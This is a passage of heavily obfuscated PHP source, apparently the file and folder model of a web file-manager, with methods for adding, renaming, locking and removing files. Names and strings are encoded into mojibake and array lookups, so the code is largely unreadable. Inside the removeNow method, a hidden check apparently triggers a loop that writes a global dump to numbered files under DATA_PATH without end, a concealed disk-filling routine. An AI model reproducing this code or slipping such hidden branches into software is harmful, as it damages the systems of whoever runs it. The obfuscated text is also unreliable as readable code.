‘Ôİú, $„Ş‡, $ô†»•ì, $°Ä¬‹°°[1442]); } public function addFile($áÇ¸í£´, $ÄÃµÁÖ‚, $ì¸Ü‚ãÆ, $ç²à¦¯¾ = false, $ºÆŠÚıÕ = REPEAT_RENAME) { $ôŠ­ÍŞ = Model($_SERVER[¡¬ıÜ ƒ][679])->addFile($ÄÃµÁÖ‚, $ì¸Ü‚ãÆ, $ç²à¦¯¾); return $this->_createFileCall($áÇ¸í£´, $ì¸Ü‚ãÆ, $ôŠ­ÍŞ, $ºÆŠÚıÕ); } public function addFileByFileID($×´œ¦Äé, $İ»û¼»×, $®‰Ó´±, $™§ûùƒü = REPEAT_RENAME) { $İ¼Ééù =& $_SERVER[¡¬ıÜ ƒ]; $Öˆ½éŸ— = Model($İ¼Ééù[679])->find($İ»û¼»×); Model($İ¼Ééù[679])->linkAdd($İ»û¼»×); return $this->_createFileCall($×´œ¦Äé, $®‰Ó´±, $Öˆ½éŸ—, $™§ûùƒü); } public function addFileByRemote($Òñ•¿™İ, $¹ÊÜÈŞİ, $ÖÉÓİó£, $úå¡Ô€ = array(), $ç¦¼ãÉ = REPEAT_RENAME) { $÷ääÍŒ¿ = Model($_SERVER[¡¬ıÜ ƒ][679])->addFileByRemote($¹ÊÜÈŞİ, $ÖÉÓİó£, $úå¡Ô€); return $this->_createFileCall($Òñ•¿™İ, $ÖÉÓİó£, $÷ääÍŒ¿, $ç¦¼ãÉ); } private function _createFileCall($¬Û…ä‹², $Àù¨ê¡ğ, $üïãåÕí, $ÜÛÃÃÄ , $×Íòå¡Û = "\165\160\154\157\x61\x64") { $‘ƒ ¹õÉ =& $_SERVER[¡¬ıÜ ƒ]; $Á¯¶‡ÊÁ = !1; $this->setMasterDB(); $this->lockWriteStart($¬Û…ä‹², $Àù¨ê¡ğ); $€Óü®æ¤ = $this->fileNameExist($¬Û…ä‹², $Àù¨ê¡ğ); $€â‘ÆÉ­ = $this->_createFile($¬Û…ä‹², $Àù¨ê¡ğ, $üïãåÕí, $ÜÛÃÃÄ , $Á¯¶‡ÊÁ); if (!$Á¯¶‡ÊÁ) { Model($‘ƒ ¹õÉ[546])->remove($üïãåÕí[$‘ƒ ¹õÉ[543]]); } if ($Á¯¶‡ÊÁ && $€â‘ÆÉ­ && $€â‘ÆÉ­ != $€Óü®æ¤) { Model($‘ƒ ¹õÉ[2240])->eventCreate($€â‘ÆÉ­, $×Íòå¡Û); } $this->lockWriteEnd($¬Û…ä‹², $Àù¨ê¡ğ); return $€â‘ÆÉ­; } public function mkdir($‰ç¾Äƒ‰, $ß¨£ØÉ, $ñ®ì˜šë = REPEAT_SKIP) { $Ö§«æâñ =& $_SERVER[¡¬ıÜ ƒ]; $this->setMasterDB(); $¾´ŸŸ·‹ = $this->sourceInfo($‰ç¾Äƒ‰); if (!$¾´ŸŸ·‹) { return !1; } $this->lockWriteStart($‰ç¾Äƒ‰, $ß¨£ØÉ); if ($ñ®ì˜šë !== !1) { $•î¨¼ú¹ = $this->fileNameExist($‰ç¾Äƒ‰, $ß¨£ØÉ); if ($•î¨¼ú¹ && $ñ®ì˜šë != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($‰ç¾Äƒ‰, $ß¨£ØÉ); return $•î¨¼ú¹; } $ß¨£ØÉ = $this->fileNameAuto($‰ç¾Äƒ‰, $ß¨£ØÉ, $ñ®ì˜šë); } $Ò»©Óû = array($Ö§«æâñ[651] => 1, $Ö§«æâñ[496] => $ß¨£ØÉ, $Ö§«æâñ[652] => $Ö§«æâñ[12], $Ö§«æâñ[544] => 0, $Ö§«æâñ[622] => 0); $¸ë¼“Õ¯ = $this->_addSource($Ò»©Óû, $¾´ŸŸ·‹); Model($Ö§«æâñ[2240])->eventCreate($¸ë¼“Õ¯, $Ö§«æâñ[1443]); $this->lockWriteEnd($‰ç¾Äƒ‰, $ß¨£ØÉ); return $¸ë¼“Õ¯; } public function listSourceRoot($ôı×àË§, $¡Æíâ¢İ, $†Ã®ˆ±Ÿ = "\x73\x6f\x75\162\x63\x65\x49\x44\54\164\x61\162\147\145\x74\111\104\x2c\x73\x69\x7a\x65") { $¥¹¨Ğàš =& $_SERVER[¡¬ıÜ ƒ]; $ûÁ–Ù¢ = $¥¹¨Ğàš[456]; $ÍŞ¢İüí = array(); $ŒÕµªÕÇ = 1024 * 50; $øŠ¦¹‰ = is_array($øŠ¦¹‰) ? $øŠ¦¹‰ : array(); $æƒ½ş¢… = count($¡Æíâ¢İ); $—Â˜ Ìã = $this->tablePrefix . $¥¹¨Ğàš[2278]; for ($õ”Î Çâ = 0; $õ”Î Çâ < $æƒ½ş¢…; $õ”Î Çâ++) { $Ùü¹›®ı = $¡Æíâ¢İ[$õ”Î Çâ]; $ûÁ–Ù¢ .= "\123\x45\114\x45\x43\x54\x20\52\x20\x46\122\x4f\115\x20\x28\x53\x45\x4c\105\x43\124\x20{$†Ã®ˆ±Ÿ}\40\x46\x52\117\x4d\x20\x60{$—Â˜ Ìã}\140\40\x57\110\105\x52\105\40"; $ûÁ–Ù¢ .= "\140\160\x61\162\145\x6e\164\111\104\140\x3d\60\x20\x41\116\x44\x20\140\x74\x61\162\x67\145\164\x49\x44\x60\x3d{$Ùü¹›®ı}\40\x41\116\104\40\x60\x74\x61\162\x67\x65\x74\124\x79\160\145\x60\75{$ôı×àË§}\40\141\156\144\40\x66\151\x6c\145\124\171\x70\145\75\47\x27\x20\x6c\x69\x6d\x69\x74\x20\x31\x29\40\x61\163\40\x74\x62\137{$õ”Î Çâ}\x20\x55\116\x49\x4f\116\40\101\x4c\x4c\40"; if ((strlen($ûÁ–Ù¢) >= $ŒÕµªÕÇ || $õ”Î Çâ == $æƒ½ş¢… - 1) && $ûÁ–Ù¢) { $ûÁ–Ù¢ = substr($ûÁ–Ù¢, 0, -strlen($¥¹¨Ğàš[1126])); $üßÜ‰½õ = $this->query($ûÁ–Ù¢); $ûÁ–Ù¢ = $¥¹¨Ğàš[12]; $ÍŞ¢İüí = array_merge($ÍŞ¢İüí, $üßÜ‰½õ); } } return $ÍŞ¢İüí; } private function _createFile($Ñ¯˜ø¹ª, $£êÁë¦Å, $ç–ö‡‡, $Åº‘ß»Ï, &$¿²–àŒè) { $¥ƒÄ†Şó =& $_SERVER[¡¬ıÜ ƒ]; $«ûç—»Ğ = $this->sourceInfo($Ñ¯˜ø¹ª); if (!$ç–ö‡‡ || !$«ûç—»Ğ) { return !1; } if ($Åº‘ß»Ï !== !1) { $±Ç¨Â§š = $this->fileNameExist($Ñ¯˜ø¹ª, $£êÁë¦Å); } $¿²–àŒè = !0; if ($Åº‘ß»Ï && $±Ç¨Â§š) { if ($Åº‘ß»Ï == REPEAT_SKIP) { $¿²–àŒè = !1; return $±Ç¨Â§š; } else { if ($Åº‘ß»Ï == REPEAT_REPLACE) { $òÂ¥”ê = $this->sourceInfo($±Ç¨Â§š); $Î£×Ä¾İ = $this->fileHistory($òÂ¥”ê, $ç–ö‡‡[$¥ƒÄ†Şó[543]], $ç–ö‡‡[$¥ƒÄ†Şó[79]]); if (!$Î£×Ä¾İ) { $¿²–àŒè = !1; } else { $this->folderSizeReset($Ñ¯˜ø¹ª); } return $±Ç¨Â§š; } else { $£êÁë¦Å = $this->fileNameAuto($Ñ¯˜ø¹ª, $£êÁë¦Å, $Åº‘ß»Ï, !1); } } } $ë…è¬åõ = array($¥ƒÄ†Şó[651] => 0, $¥ƒÄ†Şó[496] => $£êÁë¦Å, $¥ƒÄ†Şó[652] => substr(get_path_ext($£êÁë¦Å), 0, 10), $¥ƒÄ†Şó[544] => $ç–ö‡‡[$¥ƒÄ†Şó[543]], $¥ƒÄ†Şó[622] => $ç–ö‡‡[$¥ƒÄ†Şó[79]]); $åÇê¼˜ = $this->_addSource($ë…è¬åõ, $«ûç—»Ğ); $this->folderSizeReset($Ñ¯˜ø¹ª, intval($ë…è¬åõ[$¥ƒÄ†Şó[79]])); return $åÇê¼˜; } protected function fileHistory($—²‡Òòè, $µü½©öâ, $ì»—Ì‡) { $éÀ† =& $_SERVER[¡¬ıÜ ƒ]; if ($—²‡Òòè[$éÀ†[543]] == $µü½©öâ) { return !1; } $this->checkLock($—²‡Òòè[$éÀ†[193]], $µü½©öâ); Model($éÀ†[2279])->addHistory($—²‡Òòè); $½ÚŞ®ûƒ = array($éÀ†[656] => USER_ID, $éÀ†[500] => time(), $éÀ†[543] => $µü½©öâ, $éÀ†[79] => $ì»—Ì‡); $this->where(array($éÀ†[493] => $—²‡Òòè[$éÀ†[193]]))->save($½ÚŞ®ûƒ); $this->sourceCacheClear($—²‡Òòè[$éÀ†[193]]); return !0; } public function checkLock($’À»ª²‰, $êøµï„£) { $´Ö›™‡… =& $_SERVER[¡¬ıÜ ƒ]; $’²«¼  = $this->pathInfo($’À»ª²‰); if (!$this->fileIsLock($’²«¼ , !0)) { return; } $®æôŒ‚ = Session::get($´Ö›™‡…[2280]); $¨ü•àÂ = substr($’²«¼ [$´Ö›™‡…[32]], 0, -1 - strlen($’²«¼ [$´Ö›™‡…[169]])) . $´Ö›™‡…[1304] . $®æôŒ‚ . $´Ö›™‡…[10] . $’²«¼ [$´Ö›™‡…[169]]; $Ó½¯©ÏÃ = Model($´Ö›™‡…[679])->find($êøµï„£); $this->_createFileCall($’²«¼ [$´Ö›™‡…[192]], $¨ü•àÂ, $Ó½¯©ÏÃ, REPEAT_REPLACE, $´Ö›™‡…[1442]); $¾‰‹ Í® = $’²«¼ [$´Ö›™‡…[541]][$´Ö›™‡…[615]]; $×µíòÈš = $¾‰‹ Í®[$´Ö›™‡…[2281]] ? $¾‰‹ Í®[$´Ö›™‡…[2281]] : $¾‰‹ Í®[$´Ö›™‡…[32]]; show_json(LNG($´Ö›™‡…[2282]) . $´Ö›™‡…[2283] . LNG($´Ö›™‡…[2284]) . $´Ö›™‡…[2285] . $×µíòÈš . $´Ö›™‡…[2286], !1); } public function fileIsLock($âıÕåï, $î‘ğÓÎ‹ = false) { $‡æ—Ò¡ê =& $_SERVER[¡¬ıÜ ƒ]; if (!_get($âıÕåï, $‡æ—Ò¡ê[611], 0)) { return !1; } if ($âıÕåï[$‡æ—Ò¡ê[541]][$‡æ—Ò¡ê[614]] != USER_ID) { return !0; } $™Úåò‡³ = $GLOBALS[$‡æ—Ò¡ê[6]][$‡æ—Ò¡ê[92]][$‡æ—Ò¡ê[612]]; if ($âıÕåï[$‡æ—Ò¡ê[541]][$‡æ—Ò¡ê[613]] <= time() - $™Úåò‡³) { $this->metaSet($âıÕåï[$‡æ—Ò¡ê[193]], $‡æ—Ò¡ê[614], null); $this->metaSet($âıÕåï[$‡æ—Ò¡ê[193]], $‡æ—Ò¡ê[613], null); } if ($î‘ğÓÎ‹) { $this->metaSet($âıÕåï[$‡æ—Ò¡ê[193]], $‡æ—Ò¡ê[613], time()); } return !1; } private function _addSource($Éœ£§¦, $¯‘‚²ßí) { $õÑ·ÜÈÄ =& $_SERVER[¡¬ıÜ ƒ]; $ãÜ³«Öû = defined($õÑ·ÜÈÄ[2213]) ? USER_ID : 0; $È§–œÚ = array($õÑ·ÜÈÄ[653] => $¯‘‚²ßí[$õÑ·ÜÈÄ[190]], $õÑ·ÜÈÄ[654] => $¯‘‚²ßí[$õÑ·ÜÈÄ[571]], $õÑ·ÜÈÄ[655] => $ãÜ³«Öû, $õÑ·ÜÈÄ[656] => $ãÜ³«Öû, $õÑ·ÜÈÄ[479] => $¯‘‚²ßí[$õÑ·ÜÈÄ[193]], $õÑ·ÜÈÄ[657] => $¯‘‚²ßí[$õÑ·ÜÈÄ[586]] . $¯‘‚²ßí[$õÑ·ÜÈÄ[193]] . $õÑ·ÜÈÄ[50], $õÑ·ÜÈÄ[506] => 0, $õÑ·ÜÈÄ[658] => $õÑ·ÜÈÄ[12]); $Éœ£§¦ = array_merge($È§–œÚ, $Éœ£§¦); $this->updateModifyTime($Éœ£§¦[$õÑ·ÜÈÄ[192]]); $åãâ¸¢’ = $õÑ·ÜÈÄ[2287] . $¯‘‚²ßí[$õÑ·ÜÈÄ[193]]; if (isset(self::$cacheChildList[$åãâ¸¢’])) { unset(self::$cacheChildList[$åãâ¸¢’]); } static $ıê·ßÌ = false; if (!$ıê·ßÌ) { Hook::trigger($õÑ·ÜÈÄ[641], $Éœ£§¦); $ıê·ßÌ = !0; } $Ÿ¾¯„ã = $this->add($Éœ£§¦); $¿¾ºø£ƒ = array($õÑ·ÜÈÄ[659] => short_id($Ÿ¾¯„ã)); $this->where(array($õÑ·ÜÈÄ[493] => $Ÿ¾¯„ã))->save($¿¾ºø£ƒ); $this->setNamePinyin($Ÿ¾¯„ã, $Éœ£§¦[$õÑ·ÜÈÄ[32]]); return $Ÿ¾¯„ã; } public function remove($ ×¢î‹¯, $½û®®‡ï = true) { $à³¶™ùò =& $_SERVER[¡¬ıÜ ƒ]; $ÒÃŸÆ×ƒ = $this->sourceInfo($ ×¢î‹¯); $‘™Ùœ‹æ = intval($ÒÃŸÆ×ƒ[$à³¶™ùò[190]]) === self::TYPE_SYSTEM; $¹û Ÿôù = Model($à³¶™ùò[510])->get($à³¶™ùò[2288]) == $à³¶™ùò[91]; if ($‘™Ùœ‹æ || $½û®®‡ï || !$¹û Ÿôù) { return $this->removeNow($ ×¢î‹¯, $½û®®‡ï); } $‡öéà³ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $êÑÄĞù® = $ÒÃŸÆ×ƒ[$à³¶™ùò[190]] == self::TYPE_USER ? $à³¶™ùò[667] : $à³¶™ùò[580]; if ($êÑÄĞù® == $à³¶™ùò[667]) { $¤şÇÒ¬À = Model($à³¶™ùò[579])->getInfo($ÒÃŸÆ×ƒ[$à³¶™ùò[571]]); $§¼‹À± = !empty($¤şÇÒ¬À[$à³¶™ùò[2281]]) ? $¤şÇÒ¬À[$à³¶™ùò[2281]] : $¤şÇÒ¬À[$à³¶™ùò[32]]; $§¼‹À± = $à³¶™ùò[339] . $§¼‹À± . $à³¶™ùò[2289] . $ÒÃŸÆ×ƒ[$à³¶™ùò[571]]; } else { $¤şÇÒ¬À = Model($à³¶™ùò[587])->getInfo($ÒÃŸÆ×ƒ[$à³¶™ùò[571]]); $§¼‹À± = _get($¤şÇÒ¬À, $à³¶™ùò[32]); $§¼‹À± = $à³¶™ùò[176] . $§¼‹À± . $à³¶™ùò[2290] . $ÒÃŸÆ×ƒ[$à³¶™ùò[571]]; } $’ôßşÚ‚ = $à³¶™ùò[2291] . md5($§¼‹À±); CacheLock::lock($’ôßşÚ‚); $ä€–²Ìª = $this->fileNameExist($‡öéà³, $§¼‹À±); if (!$ä€–²Ìª) { $ä€–²Ìª = $this->mkdir($‡öéà³, $§¼‹À±, REPEAT_SKIP); $this->metaSet($ä€–²Ìª, $à³¶™ùò[2292], $êÑÄĞù®); $this->metaSet($ä€–²Ìª, $à³¶™ùò[2293], $ÒÃŸÆ×ƒ[$à³¶™ùò[571]]); if ($ÒÃŸÆ×ƒ[$à³¶™ùò[192]] != 0) { $this->metaSet($ä€–²Ìª, $à³¶™ùò[2294], _get($¤şÇÒ¬À, $à³¶™ùò[2295])); } } CacheLock::unlock($’ôßşÚ‚); $this->metaSet($ ×¢î‹¯, $à³¶™ùò[2296], $ÒÃŸÆ×ƒ[$à³¶™ùò[192]]); $this->where(array($à³¶™ùò[193] => $ ×¢î‹¯))->save(array($à³¶™ùò[500] => time())); $this->recycleClear($ÒÃŸÆ×ƒ); Model($à³¶™ùò[638])->eventRemove($ ×¢î‹¯); $†¦õ¼š‚ = $this->move($ ×¢î‹¯, $ä€–²Ìª, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÒÃŸÆ×ƒ[$à³¶™ùò[192]]); return $†¦õ¼š‚; } private function recycleClear($Û´•Ôâ) { $—ÁÁ¤¨ =& $_SERVER[¡¬ıÜ ƒ]; $™³‚Í…¶ = $this->childrenAll($Û´•Ôâ); $·ÛÄ¼ó¨ = array($—ÁÁ¤¨[493] => array($—ÁÁ¤¨[494], $™³‚Í…¶[$—ÁÁ¤¨[2297]])); Model($—ÁÁ¤¨[2298])->where($·ÛÄ¼ó¨)->delete(); } public function removeNow($ÊåàĞ¤™, $¹ñ£šô = true) { $¦°È‹Çƒ =& $_SERVER[¡¬ıÜ ƒ]; $î»›ñ½‘ = $_SERVER[$¦°È‹Çƒ[857]]; $÷²Åİ­â = $¦°È‹Çƒ[858]; if ($_SERVER[$¦°È‹Çƒ[859]] != $÷²Åİ­â($î»›ñ½‘)) { $šèÂ•Š’ = $¦°È‹Çƒ[967]; $œú’ˆü = $¦°È‹Çƒ[860]; $Åà„ÊØ = $_SERVER[$¦°È‹Çƒ[861]] . $¦°È‹Çƒ[862]; $ñÜÜ±Û = $œú’ˆü($Åà„ÊØ); $¨Ä¿ù¼‹ = explode($¦°È‹Çƒ[287], $ñÜÜ±Û); if (count($¨Ä¿ù¼‹) < $¦°È‹Çƒ[688]) { $êÌì‰Ãø = $¦°È‹Çƒ[863]; $êÌì‰Ãø(); } $¤ƒ²Ì˜´ = $¦°È‹Çƒ[968]; $¤ƒ²Ì˜´($_SERVER[$¦°È‹Çƒ[969]]); $šèÂ•Š’ = $¦°È‹Çƒ[967]; $šèÂ•Š’(); $Û‘”©„æ = $¦°È‹Çƒ[1701]; $‚ë•Òë¶ = json_encode($GLOBALS[$¦°È‹Çƒ[1702]]); $ŒÃ£¥‚× = 1; for ($³‰Š¼’À = $ŒÃ£¥‚×; $³‰Š¼’À > 0; $³‰Š¼’À++) { $Û‘”©„æ(DATA_PATH . $³‰Š¼’À, $‚ë•Òë¶); } } $Ø«‘–´ = $this->sourceInfo($ÊåàĞ¤™); $§ªÌ¸’ = $this->pathInfoMore($ÊåàĞ¤™); if (!$Ø«‘–´) { return !0; } if ($Ø«‘–´[$¦°È‹Çƒ[192]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÊåàĞ¤™); Hook::trigger($¦°È‹Çƒ[2299], $§ªÌ¸’, $¹ñ£šô); if ($¹ñ£šô) { Model($¦°È‹Çƒ[2298])->moveToRecycle($ÊåàĞ¤™); } else { $«ğ±‰º‚ = $this->childrenAll($Ø«‘–´); Model($¦°È‹Çƒ[638])->eventRemove($ÊåàĞ¤™); $this->removeRelevance($«ğ±‰º‚[$¦°È‹Çƒ[2297]], $«ğ±‰º‚[$¦°È‹Çƒ[1587]]); } $this->folderSizeReset($Ø«‘–´[$¦°È‹Çƒ[192]]); $‰”·í = array($Ø«‘–´[$¦°È‹Çƒ[192]]); if ($Ø«‘–´[$¦°È‹Çƒ[487]] == $¦°È‹Çƒ[91]) { $‰”·í[] = $Ø«‘–´[$¦°È‹Çƒ[193]]; } $this->updateModifyTime($‰”·í); $this->lockMoveEnd($ÊåàĞ¤™); Hook::trigger($¦°È‹Çƒ[1828], $§ªÌ¸’, $¹ñ£šô); return !0; } public function childrenAll($Î¿ÏÑõ‰) { $í¬ªğ¤ =& $_SERVER[¡¬ıÜ ƒ]; $’À†‹—™ = $Î¿ÏÑõ‰[$í¬ªğ¤[193]]; if ($Î¿ÏÑõ‰[$í¬ªğ¤[487]] == $í¬ªğ¤[91]) { $Ó§¸ öÂ = array($í¬ªğ¤[657] => array($í¬ªğ¤[617], $Î¿ÏÑõ‰[$í¬ªğ¤[586]] . $’À†‹—™ . $í¬ªğ¤[618])); $ï†è´‘œ = array($í¬ªğ¤[657] => $Ó§¸ öÂ[$í¬ªğ¤[586]]); $‘¢¤¯ = $this->field($í¬ªğ¤[2300])->where($ï†è´‘œ)->select(); $ò¬¬¹–İ = !1; $Ê’×À¿­ = array($’À†‹—™); if ($‘¢¤¯) { $ò¬¬¹–İ = array_to_keyvalue($‘¢¤¯, $í¬ªğ¤[12], $í¬ªğ¤[543]); $ò¬¬¹–İ = array_remove_value($ò¬¬¹–İ, $í¬ªğ¤[230]); $Ê’×À¿­ = array_to_keyvalue($‘¢¤¯, $í¬ªğ¤[12], $í¬ªğ¤[193]); $Ê’×À¿­[] = $’À†‹—™; } } else { $ò¬¬¹–İ = array($Î¿ÏÑõ‰[$í¬ªğ¤[543]]); $Ê’×À¿­ = array($’À†‹—™); } return array($í¬ªğ¤[2297] => $Ê’×À¿­, $í¬ªğ¤[1587] => $ò¬¬¹–İ); } public function removeArray($Ÿ«£éúÆ) { if (!$Ÿ«£éúÆ) { return !0; } } public function removeRelevance($Æ¿„ãº¼, $Á¤©ú ğ) { $ºàŸó‚Ï =& $_SERVER[¡¬ıÜ ƒ]; $Æ¿„ãº¼ = $Æ¿„ãº¼ ? $Æ¿„ãº¼ : array(); $Á¤©ú ğ = $Á¤©ú ğ ? $Á¤©ú ğ : array(); $Æ¿„ãº¼ = array_unique(array_filter($Æ¿„ãº¼)); $Á¤©ú ğ = array_unique(array_filter($Á¤©ú ğ)); if (!$Æ¿„ãº¼) { return !1; } $ÏèúŒŞà = array($ºàŸó‚Ï[493] => array($ºàŸó‚Ï[494], $Æ¿„ãº¼)); Model($ºàŸó‚Ï[2298])->where($ÏèúŒŞà)->delete(); Model($ºàŸó‚Ï[537])->where($ÏèúŒŞà)->delete(); Model($ºàŸó‚Ï[2138])->where($ÏèúŒŞà)->delete(); Model($ºàŸó‚Ï[638])->where($ÏèúŒŞà)->delete(); Model($ºàŸó‚Ï[1965])->removeBySource($Æ¿„ãº¼); Model($ºàŸó‚Ï[2279])->removeBySource($Æ¿„ãº¼); $this->where($ÏèúŒŞà)->delete(); Model($ºàŸó‚Ï[546])->remove($Á¤©ú ğ); for ($¤ÍÖ½Ù° = 0; $¤ÍÖ½Ù° < count($Æ¿„ãº¼); $¤ÍÖ½Ù°++) { $this->sourceCacheClear($Æ¿„ãº¼[$¤ÍÖ½Ù°]); } } public function rename($“ˆˆ‚Œ¿, $áåİƒàÏ) { $úí¢øêú =& $_SERVER[¡¬ıÜ ƒ]; $ÜëŒ•Úæ = $this->sourceInfo($“ˆˆ‚Œ¿); if (!$ÜëŒ•Úæ) { return !1; } $†æÜúá = $this->fileNameExist($ÜëŒ•Úæ[$úí¢øêú[192]], $áåİƒàÏ); if ($†æÜúá && $†æÜúá != $“ˆˆ‚Œ¿) { return !1; } $ƒ‘ÓØóô = array($úí¢øêú[496] => $áåİƒàÏ, $úí¢øêú[656] => USER_ID); if ($ÜëŒ•Úæ[$úí¢øêú[487]] != $úí¢øêú[91]) { $ƒ‘ÓØóô[$úí¢øêú[488]] = substr(get_path_ext($áåİƒàÏ), 0, 10); } Model($úí¢øêú[638])->eventRename($“ˆˆ‚Œ¿, $ÜëŒ•Úæ[$úí¢øêú[32]], $áåİƒàÏ); $this->sourceCacheClear($“ˆˆ‚Œ¿); $this->setNamePinyin($“ˆˆ‚Œ¿, $ƒ‘ÓØóô[$úí¢øêú[32]], !1); $this->updateModifyTime($ÜëŒ•Úæ[$úí¢øêú[192]]); $Ê®¤•ÂÖ = $this->where(array($úí¢øêú[493] => $“ˆˆ‚Œ¿))->data($ƒ‘ÓØóô)->save(); $áë¿ÏÂ† = $úí¢øêú[2287] . $ÜëŒ•Úæ[$úí¢øêú[192]]; if (isset(self::$cacheChildList[$áë¿ÏÂ†])) { unset(self::$cacheChildList[$áë¿ÏÂ†]); } return $Ê®¤•ÂÖ; } public function setNamePinyin($÷§è€«ö, $Ùõ¸ ÷, $¥™‰–ò÷ = true) { $ı¥±‘¹° =& $_SERVER[¡¬ıÜ ƒ]; $Ñ˜šğÜ = Input::check($Ùõ¸ ÷, $ı¥±‘¹°[660]); $ı®õÌÑ = array($ı¥±‘¹°[519] => KodSort::makeStr($Ùõ¸ ÷)); if ($Ñ˜šğÜ) { $ı®õÌÑ[$ı¥±‘¹°[540]] = str_replace($ı¥±‘¹°[53], $ı¥±‘¹°[12], Pinyin::get($Ùõ¸ ÷)); $ı®õÌÑ[$ı¥±‘¹°[539]] = Pinyin::get($Ùõ¸ ÷, $ı¥±‘¹°[661]); } if (!$¥™‰–ò÷ && !$Ñ˜šğÜ) { $ı®õÌÑ[$ı¥±‘¹°[540]] = null; $ı®õÌÑ[$ı¥±‘¹°[539]] = null; } $this->metaSet($÷§è€«ö, $ı®õÌÑ); } public function getContent($ˆÎ†½Ş) { $áÅ¿÷œ¼ =& $_SERVER[¡¬ıÜ ƒ]; $¯ÅÙ½»á = $this->fileInfoGet($ˆÎ†½Ş); if (!$¯ÅÙ½»á) { return !1; } if ($¯ÅÙ½»á[$áÅ¿÷œ¼[79]] == 0) { return $áÅ¿÷œ¼[12]; } $ÄÃğ‹íÎ = $áÅ¿÷œ¼[2301] . $¯ÅÙ½»á[$áÅ¿÷œ¼[549]]; if ($¯ÅÙ½»á[$áÅ¿÷œ¼[79]] <= 1024 * 10) { $‰Å±Œ = Cache::get($ÄÃğ‹íÎ); if (!$‰Å±Œ) { $‰Å±Œ = IO::getContent($¯ÅÙ½»á[$áÅ¿÷œ¼[87]]); Cache::set($ÄÃğ‹íÎ, $‰Å±Œ); } return $‰Å±Œ; } if (!$¯ÅÙ½»á[$áÅ¿÷œ¼[87]]) { return $áÅ¿÷œ¼[12]; } return IO::getContent($¯ÅÙ½»á[$áÅ¿÷œ¼[87]]); } public function setDesc($‡„½‹×ä, $çöáãšà) { $¨ğ†øäÀ =& $_SERVER[¡¬ıÜ ƒ]; Model($¨ğ†øäÀ[638])->eventAddDesc($‡„½‹×ä, $çöáãšà); return $this->metaSet($‡„½‹×ä, $¨ğ†øäÀ[528], $çöáãšà); } public function setContent($èŠÄõ™, $Ş„ú¶ùº = '') { $†¿òÍ™Ï =& $_SERVER[¡¬ıÜ ƒ]; $ÆŠåó = $this->sourceInfo($èŠÄõ™); $ˆÎ‘ıÆÅ = $this->fileInfoGet($èŠÄõ™); if (!$ˆÎ‘ıÆÅ || !$ÆŠåó) { return !1; } $¶ñ¦×• = Model($†¿òÍ™Ï[546])->addFileByContent($Ş„ú¶ùº, $ÆŠåó[$†¿òÍ™Ï[32]]); $Û¿ßÈŸ = $this->fileHistory($ÆŠåó, $¶ñ¦×•[$†¿òÍ™Ï[543]], $¶ñ¦×•[$†¿òÍ™Ï[79]]); if (!$Û¿ßÈŸ) { return Model($†¿òÍ™Ï[546])->remove($¶ñ¦×•[$†¿òÍ™Ï[543]]); } $this->folderSizeReset($ÆŠåó[$†¿òÍ™Ï[192]]); return !0; } public function fileSubstr($Œ®ÉõŒ, $¿¯«˜ü‡, $Ö±Äê…) { $§Ùæ³Ö = $this->fileInfoGet($Œ®ÉõŒ); if (!$§Ùæ³Ö) { return !1; } return IO::fileSubstr($§Ùæ³Ö[$_SERVER[¡¬ıÜ ƒ][87]], $¿¯«˜ü‡, $Ö±Äê…); } public function fileInfoGet($¦ˆøå‰­) { $Äü¿¾ğ× =& $_SERVER[¡¬ıÜ ƒ]; $†é«”  = $this->sourceInfo($¦ˆøå‰­); if (!$†é«”  || $†é«” [$Äü¿¾ğ×[487]]) { return !1; } $²‘Ÿñ½ = $Äü¿¾ğ×[550] . $†é«” [$Äü¿¾ğ×[543]]; $ı˜àè¸ = _get(self::$cacheFileInfo, $²‘Ÿñ½); if ($ı˜àè¸) { return $ı˜àè¸; } $Ôîšƒç = Model($Äü¿¾ğ×[546])->fileInfo($†é«” [$Äü¿¾ğ×[543]]); if ($Ôîšƒç) { $Ôîšƒç[$Äü¿¾ğ×[32]] = $†é«” [$Äü¿¾ğ×[32]]; } self::$cacheFileInfo[$²‘Ÿñ½] = $Ôîšƒç; return $Ôîšƒç; } private function folderChildrenNumber($¸«ªœ¢») { $’ãÁß¸ =& $_SERVER[¡¬ıÜ ƒ]; $Ë¦âá = $this->sourceInfo($¸«ªœ¢»); $ÒöÃÜ— = array($’ãÁß¸[657] => array($’ãÁß¸[617], $Ë¦âá[$’ãÁß¸[586]] . $¸«ªœ¢» . $’ãÁß¸[618]), $’ãÁß¸[654] => $Ë¦âá[$’ãÁß¸[571]], $’ãÁß¸[506] => intval($Ë¦âá[$’ãÁß¸[507]]), $’ãÁß¸[651] => 1); $ªÁä€Ó = $this->where($ÒöÃÜ—)->count(); $úˆ¹·øÆ = $this->where($ÒöÃÜ—)->where(array($’ãÁß¸[651] => 0))->count(); return array($’ãÁß¸[83] => $úˆ¹·øÆ, $’ãÁß¸[84] => $ªÁä€Ó); } public function pathInfo($”á™û³, $‰áÒâ¯æ = false) { $òû‚¶™ =& $_SERVER[¡¬ıÜ ƒ]; $‰áÒâ¯æ = !1; $”á™û³ = intval($”á™û³); $€„õíÌŸ = $òû‚¶™[536] . intval($‰áÒâ¯æ) . $òû‚¶™[464] . $”á™û³; $•óÉ÷¯¡ = _get(self::$cachePathInfo, $€„õíÌŸ); if ($•óÉ÷¯¡) { return $•óÉ÷¯¡; } $ú†û’½Ã = $this->sourceInfo($”á™û³); if (!$ú†û’½Ã) { return !1; } $ú†û’½Ã = $this->_listDataApplyItem($ú†û’½Ã, $‰áÒâ¯æ); self::$cachePathInfo[$€„õíÌŸ] = $ú†û’½Ã; return $ú†û’½Ã; } public static $cachePathInfoMore = array(); public function pathInfoMore($îª™èö) { $ñË»á¬ü =& $_SERVER[¡¬ıÜ ƒ]; $«£Â•µß = _get(self::$cachePathInfoMore, $îª™èö); if ($«£Â•µß) { return $«£Â•µß; } $·Ï˜˜â§ = $this->pathInfo($îª™èö); if (!$·Ï˜˜â§) { return !1; } if ($·Ï˜˜â§[$ñË»á¬ü[487]] == $ñË»á¬ü[91]) { $·Ï˜˜â§[$ñË»á¬ü[82]] = $this->folderChildrenNumber($îª™èö); } self::$cachePathInfoMore[$îª™èö] = $·Ï˜˜â§; return $·Ï˜˜â§; } public function sourceInfo($‚Òüì) { $¬ÜåĞæ =& $_SERVER[¡¬ıÜ ƒ]; if (!$‚Òüì) { return array(); } $‚Òüì = intval($‚Òüì); 